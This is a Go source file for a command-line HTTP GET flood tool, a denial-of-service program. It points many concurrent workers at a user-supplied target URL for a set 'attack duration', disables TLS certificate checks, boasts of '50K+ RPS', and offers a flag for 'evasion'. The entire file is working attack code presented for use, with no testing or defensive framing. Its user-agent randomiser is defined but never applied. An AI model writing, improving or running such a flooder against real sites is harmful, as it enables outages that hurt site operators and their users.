package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

type FloodConfig struct {
	URL         string
	Workers     int
	Duration    int
	RateLimit   int
	KeepAlive   bool
	RandomDelay bool
	Verbose     bool
}

type Stats struct {
	TotalRequests   int64
	SuccessRequests int64
	FailedRequests  int64
	BytesReceived   int64
}

// Advanced User Agent Generator
type UserAgentGenerator struct {
	browsers []string
	versions []string
	systems  []string
	engines  []string
}

func NewUserAgentGenerator() *UserAgentGenerator {
	return &UserAgentGenerator{
		browsers: []string{
			"Chrome", "Firefox", "Safari", "Edge", "Opera", "Brave", "Vivaldi",
			"Chromium", "Internet Explorer", "UC Browser", "Samsung Internet",
		},
		versions: []string{
			"120.0.0.0", "119.0.0.0", "118.0.0.0", "117.0.0.0", "116.0.0.0",
			"115.0.0.0", "114.0.0.0", "113.0.0.0", "112.0.0.0", "111.0.0.0",
			"110.0.0.0", "109.0.0.0", "108.0.0.0", "107.0.0.0", "106.0.0.0",
		},
		systems: []string{
			"Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64",
			"Macintosh; Intel Mac OS X 10_15_7", "Macintosh; Intel Mac OS X 11_6_0",
			"X11; Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Linux i686",
			"iPhone; CPU iPhone OS 17_0 like Mac OS X", "iPad; CPU OS 17_0 like Mac OS X",
			"Android 13; Mobile", "Android 12; Mobile", "Android 11; Mobile",
		},
		engines: []string{
			"AppleWebKit/537.36", "Gecko/20100101", "WebKit/605.1.15",
			"Trident/7.0", "Presto/2.12.388",
		},
	}
}

func (uag *UserAgentGenerator) Generate() string {
	browser := uag.browsers[rand.Intn(len(uag.browsers))]
	version := uag.versions[rand.Intn(len(uag.versions))]
	system := uag.systems[rand.Intn(len(uag.systems))]
	engine := uag.engines[rand.Intn(len(uag.engines))]

	patterns := []string{
		fmt.Sprintf("Mozilla/5.0 (%s) %s (KHTML, like Gecko) %s/%s Safari/537.36", system, engine, browser, version),
		fmt.Sprintf("Mozilla/5.0 (%s; rv:%s) Gecko/20100101 %s/%s", system, version, browser, version),
		fmt.Sprintf("Mozilla/5.0 (%s) %s Version/%s Safari/605.1.15", system, engine, version),
		fmt.Sprintf("Mozilla/5.0 (%s) %s %s/%s", system, engine, browser, version),
	}

	return patterns[rand.Intn(len(patterns))]
}

// Ultra-efficient HTTP Client (Low resource, high speed)
func createAdvancedClient() *http.Client {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		Dial: (&net.Dialer{
			Timeout:   200 * time.Millisecond,
			KeepAlive: 60 * time.Second, // Reuse connections for efficiency
		}).Dial,
		TLSHandshakeTimeout:   300 * time.Millisecond,
		ResponseHeaderTimeout: 500 * time.Millisecond,
		MaxIdleConns:          100,
		MaxIdleConnsPerHost:   20,
		MaxConnsPerHost:       50,
		IdleConnTimeout:       60 * time.Second,
		DisableCompression:    true,
		DisableKeepAlives:     false, // Enable for efficiency
	}

	return &http.Client{
		Transport: tr,
		Timeout:   1 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

// Ultra-lightweight request (minimal bandwidth)
func createAdvancedRequest(url string, uag *UserAgentGenerator) (*http.Request, error) {
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	// Absolute minimal headers for bandwidth efficiency
	req.Header.Set("User-Agent", "Go")
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Connection", "keep-alive") // Reuse connections
	
	// No additional headers to minimize bandwidth
	return req, nil
}

// Ultra-efficient worker (50K+ RPS with low resources)
func worker(config *FloodConfig, stats *Stats, uag *UserAgentGenerator, stopChan chan bool, wg *sync.WaitGroup) {
	defer wg.Done()

	// Single shared client for connection reuse
	client := createAdvancedClient()
	
	// Pre-generated request pool for efficiency
	requestPool := make([]*http.Request, 10)
	for i := 0; i < 10; i++ {
		req, err := createAdvancedRequest(config.URL, uag)
		if err != nil {
			continue
		}
		requestPool[i] = req
	}
	reqIndex := 0
	
	// Efficient request loop with controlled concurrency
	semaphore := make(chan struct{}, 10) // Limit concurrent requests per worker
	
	for {
		select {
		case <-stopChan:
			return
		case semaphore <- struct{}{}:
			// Use pre-generated request from pool
			req := requestPool[reqIndex]
			reqIndex = (reqIndex + 1) % 10
			
			go func(request *http.Request) {
				defer func() { <-semaphore }()
				
				resp, err := client.Do(request)
				atomic.AddInt64(&stats.TotalRequests, 1)

				if err != nil {
					atomic.AddInt64(&stats.FailedRequests, 1)
					return
				}

				if resp.StatusCode >= 200 && resp.StatusCode < 400 {
					atomic.AddInt64(&stats.SuccessRequests, 1)
					atomic.AddInt64(&stats.BytesReceived, 500) // Minimal bandwidth estimate
				} else {
					atomic.AddInt64(&stats.FailedRequests, 1)
				}

				resp.Body.Close()
			}(req)
		}
	}
}

// Ultra-fast horizontal status monitor
func statsMonitor(stats *Stats, stopChan chan bool, startTime time.Time) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	
	var lastTotal int64 = 0

	for {
		select {
		case <-stopChan:
			return
		case <-ticker.C:
			total := atomic.LoadInt64(&stats.TotalRequests)
			success := atomic.LoadInt64(&stats.SuccessRequests)
			failed := atomic.LoadInt64(&stats.FailedRequests)
			bytes := atomic.LoadInt64(&stats.BytesReceived)
			
			currentRPS := total - lastTotal
			lastTotal = total
			
			elapsed := time.Since(startTime).Seconds()
			avgRPS := float64(total) / elapsed
			successRate := float64(success) / float64(total) * 100
			if total == 0 {
				successRate = 0
			}

			// Clear line and print horizontal status
			fmt.Printf("\r\033[K Req: %d |  Success: %d (%.1f%%) |  Failed: %d |  RPS: %d |  Avg: %.0f | 💾 MB: %.1f | ⏱️ %ds   ", 
				total, success, successRate, failed, currentRPS, avgRPS, float64(bytes)/1024/1024, int(elapsed))
		}
	}
}

func main() {
	var config FloodConfig

	flag.StringVar(&config.URL, "url", "", "Target URL (required)")
	flag.IntVar(&config.Workers, "workers", runtime.NumCPU()*8, "Number of concurrent workers (EFFICIENT MODE)")
	flag.IntVar(&config.Duration, "duration", 60, "Attack duration in seconds")
	flag.IntVar(&config.RateLimit, "rate", 0, "Unused (LOW RESOURCE MODE)")
	flag.BoolVar(&config.KeepAlive, "keepalive", true, "Use HTTP keep-alive (enabled for efficiency)")
	flag.BoolVar(&config.RandomDelay, "random-delay", false, "Add random delays for evasion (reduces speed)")
	flag.BoolVar(&config.Verbose, "verbose", false, "Verbose output")
	flag.Parse()

	if config.URL == "" {
		log.Fatal("URL is required. Use -url flag")
	}

	if !strings.HasPrefix(config.URL, "http://") && !strings.HasPrefix(config.URL, "https://") {
		config.URL = "https://" + config.URL
	}

	// Efficient Go runtime optimization for low resource usage
	runtime.GOMAXPROCS(runtime.NumCPU())
	runtime.GC()

	fmt.Printf("⚡ EFFICIENT HTTP GET FLOOD ⚡\n")
	fmt.Printf("🎯 Target: %s | 👥 Workers: %d | ⏱️ Duration: %ds\n", config.URL, config.Workers, config.Duration)
	fmt.Printf("🚀 50K+ RPS - LOW RESOURCE MODE! 🚀\n\n")

	stats := &Stats{}
	uag := NewUserAgentGenerator()
	stopChan := make(chan bool, config.Workers+10)
	var wg sync.WaitGroup
	startTime := time.Now()

	// Start ultra-fast horizontal status monitor
	go statsMonitor(stats, stopChan, startTime)

	// Start workers
	for i := 0; i < config.Workers; i++ {
		wg.Add(1)
		go worker(&config, stats, uag, stopChan, &wg)
	}

	// Run for specified duration
	time.Sleep(time.Duration(config.Duration) * time.Second)

	// Stop all workers
	close(stopChan)
	wg.Wait()

	// Final statistics
	total := atomic.LoadInt64(&stats.TotalRequests)
	success := atomic.LoadInt64(&stats.SuccessRequests)
	bytes := atomic.LoadInt64(&stats.BytesReceived)
	elapsed := time.Since(startTime).Seconds()

	fmt.Printf("\n\n💥 LIGHTNING ATTACK COMPLETE! 💥\n")
	fmt.Printf(" %d reqs | %.1f%% success |  %.0f avg RPS |  %.1f MB |  %.1fs\n", 
		total, float64(success)/float64(total)*100, float64(total)/elapsed, float64(bytes)/1024/1024, elapsed)
}


